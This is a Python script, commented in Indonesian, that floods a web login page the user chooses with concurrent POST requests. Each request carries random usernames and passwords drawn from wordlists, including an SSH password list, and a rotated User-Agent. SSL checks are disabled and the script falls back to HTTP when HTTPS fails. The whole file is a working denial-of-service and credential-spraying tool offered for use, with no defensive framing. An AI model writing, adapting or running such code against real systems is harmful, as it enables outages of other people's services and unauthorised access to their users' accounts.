import aiohttp
import asyncio
import random
import os
from aiohttp import ClientSession, ClientTimeout
from urllib.parse import urlparse
import validators

# Fungsi untuk membaca User-Agent dari file
def load_user_agents(file_path):
    with open(file_path, "r") as f:
        return [line.strip() for line in f.readlines() if line.strip()]

# Fungsi untuk membaca username dari file
def load_usernames(file_path):
    with open(file_path, "r") as f:
        return [line.strip() for line in f.readlines() if line.strip()]

# Fungsi untuk membaca password dari file dengan encoding iso-8859-1
def load_passwords(file_path):
    with open(file_path, "r", encoding="iso-8859-1") as f:
        return [line.strip() for line in f.readlines() if line.strip()]

# Memuat data dari file
user_agents = load_user_agents("user-agents.txt")
usernames = load_usernames("usernames.txt")
passwords = load_passwords("ssh_passwd.txt")

# Fungsi untuk membuat nama file berdasarkan target domain
def generate_filename_from_target(target_url, extension="txt"):
    domain = urlparse(target_url).netloc  # Ekstrak domain dari URL
    if not domain:
        raise ValueError("URL target tidak valid")

    # Membuat folder output jika belum ada
    output_folder = "dos-login-v1"
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    # Periksa apakah file dengan nama yang sama sudah ada, jika ya, tambahkan angka
    base_name = os.path.join(output_folder, domain)
    counter = 1
    while os.path.exists(f"{base_name}-{counter}.{extension}"):
        counter += 1
    return f"{base_name}-{counter}.{extension}"

# Fungsi untuk menyimpan log ke file
def log_to_file(log_message, file_name):
    with open(file_name, "a") as f:
        f.write(log_message + "\n")

# Fungsi untuk memilih User-Agent secara acak
def random_user_agent():
    return random.choice(user_agents)

# Fungsi untuk memilih username dan password secara acak
def random_credentials():
    username = random.choice(usernames)
    password = random.choice(passwords)
    return username, password

# Fungsi untuk mencoba HTTP jika HTTPS gagal
def fallback_to_http(target_url):
    parsed_url = urlparse(target_url)
    if parsed_url.scheme == "https":
        http_url = f"http://{parsed_url.netloc}{parsed_url.path}"
        print(f"Switching to HTTP: {http_url}")
        return http_url
    return target_url

# Fungsi untuk melakukan serangan DoS ke body web dengan retry dan fallback ke HTTP
async def dos_attack(target_url, session, log_file, retries=3):
    headers = {
        "User-Agent": random_user_agent(),
        "Content-Type": "application/x-www-form-urlencoded",
    }

    # Menggunakan kredensial acak dari file
    username, password = random_credentials()

    payload = {
        "username": username,
        "password": password,
    }

    for attempt in range(retries):
        try:
            async with session.post(target_url, data=payload, headers=headers) as response:
                log_message = f"Sent request to {target_url} with username={username}, status code: {response.status}"
                print(log_message)
                log_to_file(log_message, log_file)
                break
        except aiohttp.ClientConnectorError as e:
            if attempt < retries - 1:
                print(f"Koneksi gagal, mencoba ulang... ({attempt+1}/{retries})")
                await asyncio.sleep(2)  # Tunggu sebelum mencoba ulang
            else:
                # Coba fallback ke HTTP
                target_url = fallback_to_http(target_url)
                log_message = f"Gagal setelah {retries} percobaan: {e}"
                print(log_message)
                log_to_file(log_message, log_file)

# Fungsi untuk memulai serangan dengan banyak request secara bersamaan
async def start_attack(target_url, num_requests, log_file):
    # Konfigurasi timeout untuk permintaan HTTP
    timeout = ClientTimeout(total=60, connect=20, sock_connect=20, sock_read=20)

    # Membuat session dengan menonaktifkan verifikasi SSL
    async with ClientSession(
        connector=aiohttp.TCPConnector(limit_per_host=500, ssl=False), timeout=timeout
    ) as session:
        tasks = []
        for _ in range(num_requests):
            tasks.append(dos_attack(target_url, session, log_file))

        # Membatasi jumlah concurrent requests dengan semaphore
        semaphore = asyncio.Semaphore(100)

        async def limited_task(task):
            async with semaphore:
                return await task

        # Menjalankan semua tugas (requests) dengan batasan concurrent requests
        await asyncio.gather(*[limited_task(task) for task in tasks])

# Validasi input dari pengguna
target_url = input("Masukkan URL target LOGIN (contoh: https://example.com/): ").strip()
if not validators.url(target_url):
    raise ValueError("URL tidak valid. Harap masukkan URL yang benar.")

try:
    num_requests = int(input("Masukkan jumlah permintaan (contoh: 500): ").strip())
    if num_requests <= 0:
        raise ValueError("Jumlah permintaan harus lebih dari 0.")
except ValueError as e:
    raise ValueError("Input jumlah permintaan tidak valid. Harap masukkan angka yang benar.") from e

# Membuat file log berdasarkan target domain
log_file = generate_filename_from_target(target_url)

# Menjalankan serangan
asyncio.run(start_attack(target_url, num_requests, log_file))
